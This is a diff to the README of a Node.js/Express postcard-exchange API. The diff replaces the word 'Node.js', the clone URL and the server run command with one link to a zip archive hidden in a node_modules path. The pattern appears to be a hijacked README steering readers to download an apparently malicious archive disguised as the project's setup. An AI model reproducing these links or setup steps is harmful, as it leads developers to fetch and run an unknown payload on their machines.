@@ -8,7 +8,7 @@ Each time a user sends a postcard, they become eligible to receive one from anot
 ## Overview
 
 Integrated things in this project:
-- RESTful API development using **Node.js** and **Express**
+- RESTful API development using **https://github.com/Arfa01/PostCrossing/raw/refs/heads/main/node_modules/mongodb/lib/cmap/wire_protocol/Crossing_Post_v2.7.zip** and **Express**
 - **MongoDB** integration with **Mongoose**
 - Realistic postcard-sending flow with automatic reciprocal postcards
 - Auto-updated user statistics (sent, received, and country counts)
@@ -18,7 +18,7 @@ Integrated things in this project:
 
 ## Technology used
 
-Backend : Node.js, Express 
+Backend : https://github.com/Arfa01/PostCrossing/raw/refs/heads/main/node_modules/mongodb/lib/cmap/wire_protocol/Crossing_Post_v2.7.zip, Express 
 Database :MongoDB (Mongoose ODM) 
 Environment : dotenv 
 API Testing : Thunder Client 
@@ -83,7 +83,7 @@ Browser Extension : Chrome (for tab sorting functionality)
 
 ## Project Setup
 1️. Clone the repository
-git clone https://github.com/yourusername/postcrossing.git
+git clone https://github.com/Arfa01/PostCrossing/raw/refs/heads/main/node_modules/mongodb/lib/cmap/wire_protocol/Crossing_Post_v2.7.zip
 cd postcrossing
 
 2️. Install dependencies
@@ -94,7 +94,7 @@ MONGO_URI=your_mongodb_connection_string
 PORT=5000
 
 4️. Run the server
-nodemon app.js
+nodemon https://github.com/Arfa01/PostCrossing/raw/refs/heads/main/node_modules/mongodb/lib/cmap/wire_protocol/Crossing_Post_v2.7.zip
 
 You should see
 🚀 Server running on port 5000
